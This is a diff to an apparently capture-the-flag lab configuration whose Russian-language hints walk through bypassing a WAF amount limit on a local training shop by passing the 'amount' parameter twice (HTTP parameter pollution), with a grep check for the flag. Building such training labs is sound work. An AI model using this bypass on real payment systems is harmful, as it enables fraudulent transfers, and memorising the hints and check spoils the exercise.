@@ -21,6 +21,7 @@ lab:
   files: [task.md]
   check: "grep -q 'nto{' found.txt"
   hints:
+    - "Повторение (`web-waf-bypass`): WAF и приложение парсят ввод по-разному; сначала `curl -s 'http://shop.local/transfer?amount=100'`."
     - В пределах лимита: `curl -s 'http://shop.local/transfer?amount=100'`.
     - Сверх лимита блокируется: `curl -s 'http://shop.local/transfer?amount=10000'`.
     - Передай параметр дважды: `curl -s 'http://shop.local/transfer?amount=100&amount=10000'`.
